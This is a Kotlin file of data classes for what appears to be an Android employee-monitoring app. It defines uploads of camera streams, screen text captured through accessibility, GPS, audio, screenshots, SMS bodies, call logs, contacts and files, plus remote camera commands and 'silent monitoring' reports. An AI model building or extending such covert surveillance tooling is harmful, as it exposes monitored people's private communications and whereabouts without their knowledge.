package com.example.kabensatudata.data.remote.dto

import com.google.gson.annotations.SerializedName

/** Request to register a camera stream on the server. */
data class CameraRegisterRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("local_ip") val localIp: String,
    @SerializedName("port") val port: Int,
    @SerializedName("lens") val lens: String = "FRONT",
    @SerializedName("fcm_token") val fcmToken: String? = null
)

/** Request to unregister (deactivate) a camera stream. */
data class CameraUnregisterRequest(
    @SerializedName("device_name") val deviceName: String
)

/** Request to register device FCM token + IP (for receiving camera commands). */
data class CameraDeviceRegisterRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("fcm_token") val fcmToken: String,
    @SerializedName("local_ip") val localIp: String? = null,
    @SerializedName("screen_on") val screenOn: Boolean? = null
)

/** Request to send camera command to a device. */
data class CameraCommandRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("action") val action: String,
    @SerializedName("lens") val lens: String? = null,
    @SerializedName("params") val params: String? = null
)

/** Active camera device returned by GET /camera/active. */
data class CameraDeviceDto(
    @SerializedName("id") val id: Long? = null,
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("local_ip") val localIp: String? = null,
    @SerializedName("port") val port: Int? = null,
    @SerializedName("lens") val lens: String? = null,
    @SerializedName("stream_url") val streamUrl: String? = null,
    @SerializedName("registered_at") val registeredAt: String? = null,
    @SerializedName("is_streaming") val isStreaming: Boolean = false,
    @SerializedName("status") val status: String = "offline",
    @SerializedName("active_modules") val activeModules: List<String> = emptyList(),
    @SerializedName("last_heartbeat_at") val lastHeartbeatAt: String? = null,
    @SerializedName("screen_on") val screenOn: Boolean? = null
)

/** Response for camera command. */
data class CameraCommandResponse(
    @SerializedName("message") val message: String,
    @SerializedName("success") val success: Boolean = false
)

/** Request to upload accessibility activity log. */
data class ActivityLogRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("app_package") val appPackage: String,
    @SerializedName("app_label") val appLabel: String,
    @SerializedName("texts") val texts: List<String>,
    @SerializedName("timestamp") val timestamp: String
)

/** Single activity log entry returned by server. */
data class ActivityLogEntry(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("app_package") val appPackage: String,
    @SerializedName("app_label") val appLabel: String,
    @SerializedName("texts") val texts: List<String>,
    @SerializedName("timestamp") val timestamp: String
)

/** Request to upload GPS location from employee device. */
data class LocationUploadRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("latitude") val latitude: Double,
    @SerializedName("longitude") val longitude: Double,
    @SerializedName("accuracy") val accuracy: Float,
    @SerializedName("timestamp") val timestamp: String
)

/** Single location entry returned by server. */
data class LocationEntry(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("latitude") val latitude: Double,
    @SerializedName("longitude") val longitude: Double,
    @SerializedName("accuracy") val accuracy: Float,
    @SerializedName("timestamp") val timestamp: String
)

/** Audio recording entry returned by server. */
data class AudioEntry(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("filename") val filename: String,
    @SerializedName("type") val type: String,       // "clip" or "live"
    @SerializedName("size") val size: Long,
    @SerializedName("timestamp") val timestamp: String
)

// ─── Remote Control DTOs ───────────────────────────────

/** Upload device info from employee phone. */
data class DeviceInfoUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("battery_level") val batteryLevel: String,
    @SerializedName("storage_total") val storageTotal: String,
    @SerializedName("storage_free") val storageFree: String,
    @SerializedName("ram_total") val ramTotal: String,
    @SerializedName("ram_free") val ramFree: String,
    @SerializedName("os_version") val osVersion: String,
    @SerializedName("model") val model: String,
    @SerializedName("wifi_name") val wifiName: String,
    @SerializedName("uptime") val uptime: String,
    @SerializedName("timestamp") val timestamp: String
)

/** Device info entry returned by server. */
data class DeviceInfoEntry(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("battery_level") val batteryLevel: String,
    @SerializedName("storage_total") val storageTotal: String,
    @SerializedName("storage_free") val storageFree: String,
    @SerializedName("ram_total") val ramTotal: String,
    @SerializedName("ram_free") val ramFree: String,
    @SerializedName("os_version") val osVersion: String,
    @SerializedName("model") val model: String,
    @SerializedName("wifi_name") val wifiName: String,
    @SerializedName("uptime") val uptime: String,
    @SerializedName("timestamp") val timestamp: String
)

/** Single installed app item. */
data class InstalledAppItem(
    @SerializedName("app_name") val appName: String,
    @SerializedName("package_name") val packageName: String
)

/** Upload installed apps list from employee phone. */
data class AppListUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("apps") val apps: List<InstalledAppItem>,
    @SerializedName("timestamp") val timestamp: String
)

/** App list entry returned by server. */
data class AppListEntry(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("apps") val apps: List<InstalledAppItem>,
    @SerializedName("timestamp") val timestamp: String
)

// ─── Device Monitoring DTOs ─────────────────────────────

/** Bulk upload of device activity logs for silent monitoring. */
data class DeviceLogBulkRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("logs") val logs: List<DeviceLogItem>
)

data class DeviceLogItem(
    @SerializedName("event_type") val eventType: String,
    @SerializedName("event_data") val eventData: String,
    @SerializedName("timestamp") val timestamp: Long
)

/** Admin report: summary of all devices. */
data class DeviceReportSummary(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("user_name") val userName: String,
    @SerializedName("user_email") val userEmail: String? = null,
    @SerializedName("last_active") val lastActive: String? = null,
    @SerializedName("status") val status: String = "offline",  // online, idle, offline
    @SerializedName("today_active_minutes") val todayActiveMinutes: Int = 0,
    @SerializedName("today_app_usage_minutes") val todayAppUsageMinutes: Int = 0,
    @SerializedName("total_events_today") val totalEventsToday: Int = 0
)

/** Admin report: detailed timeline for a specific device. */
data class DeviceReportDetail(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("user_name") val userName: String,
    @SerializedName("events") val events: List<DeviceReportEvent>,
    @SerializedName("app_usage") val appUsage: List<DeviceAppUsage>,
    @SerializedName("daily_summary") val dailySummary: DeviceDailySummary? = null
)

data class DeviceReportEvent(
    @SerializedName("event_type") val eventType: String,
    @SerializedName("event_data") val eventData: String,
    @SerializedName("timestamp") val timestamp: String
)

data class DeviceAppUsage(
    @SerializedName("app_name") val appName: String,
    @SerializedName("package_name") val packageName: String? = null,
    @SerializedName("duration_minutes") val durationMinutes: Int,
    @SerializedName("is_own_app") val isOwnApp: Boolean = false
)

data class DeviceDailySummary(
    @SerializedName("first_active") val firstActive: String? = null,
    @SerializedName("last_active") val lastActive: String? = null,
    @SerializedName("total_screen_on_minutes") val totalScreenOnMinutes: Int = 0,
    @SerializedName("total_app_minutes") val totalAppMinutes: Int = 0,
    @SerializedName("screens_visited") val screensVisited: List<String> = emptyList()
)

data class DeviceReportListResponse(
    @SerializedName("devices") val devices: List<DeviceReportSummary>
)

data class DeviceReportDetailResponse(
    @SerializedName("report") val report: DeviceReportDetail
)

// ─── Screenshot DTOs ─────────────────────────────────

data class ScreenshotListResponse(
    @SerializedName("screenshots") val screenshots: List<ScreenshotItem> = emptyList(),
    @SerializedName("total") val total: Int = 0
)

data class ScreenshotItem(
    @SerializedName("id") val id: Int,
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("url") val url: String,
    @SerializedName("thumbnail_url") val thumbnailUrl: String? = null,
    @SerializedName("file_size") val fileSize: Long = 0,
    @SerializedName("captured_at") val capturedAt: String
)

// ─── SMS / Call / Contacts DTOs ──────────────────────────

data class SmsItem(
    @SerializedName("address") val address: String,
    @SerializedName("body") val body: String,
    @SerializedName("date") val date: String,
    @SerializedName("type") val type: String, // "inbox" / "sent"
    @SerializedName("contact_name") val contactName: String? = null
)

data class SmsLogUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("messages") val messages: List<SmsItem>
)

data class CallItem(
    @SerializedName("number") val number: String,
    @SerializedName("contact_name") val contactName: String? = null,
    @SerializedName("duration") val duration: Int, // seconds
    @SerializedName("date") val date: String,
    @SerializedName("type") val type: String // "incoming" / "outgoing" / "missed"
)

data class CallLogUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("calls") val calls: List<CallItem>
)

data class ContactItem(
    @SerializedName("name") val name: String,
    @SerializedName("phones") val phones: List<String> = emptyList()
)

data class ContactsUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("contacts") val contacts: List<ContactItem>
)

data class FileItem(
    @SerializedName("name") val name: String,
    @SerializedName("path") val path: String,
    @SerializedName("size") val size: Long,
    @SerializedName("mime_type") val mimeType: String? = null,
    @SerializedName("last_modified") val lastModified: String
)

data class FileListUpload(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("files") val files: List<FileItem>
)

// ─── File Manager Enhanced DTOs ─────────────────────────

/** Browse response from device-monitor/files/{device}/browse */
data class FileBrowseResponse(
    @SerializedName("path") val path: String,
    @SerializedName("files") val files: List<FileBrowseItem> = emptyList(),
    @SerializedName("total") val total: Int = 0
)

data class FileBrowseItem(
    @SerializedName("id") val id: Long,
    @SerializedName("name") val name: String,
    @SerializedName("path") val path: String,
    @SerializedName("parent_path") val parentPath: String,
    @SerializedName("is_directory") val isDirectory: Boolean = false,
    @SerializedName("size") val size: Long = 0,
    @SerializedName("mime_type") val mimeType: String? = null,
    @SerializedName("last_modified") val lastModified: String? = null,
    @SerializedName("thumbnail_url") val thumbnailUrl: String? = null
)

/** Response for pending/ready file downloads */
data class FileDownloadsResponse(
    @SerializedName("downloads") val downloads: List<FileDownloadItem> = emptyList()
)

data class FileDownloadItem(
    @SerializedName("id") val id: Long,
    @SerializedName("original_path") val originalPath: String,
    @SerializedName("file_size") val fileSize: Long = 0,
    @SerializedName("mime_type") val mimeType: String? = null,
    @SerializedName("status") val status: String = "pending",
    @SerializedName("created_at") val createdAt: String? = null
)
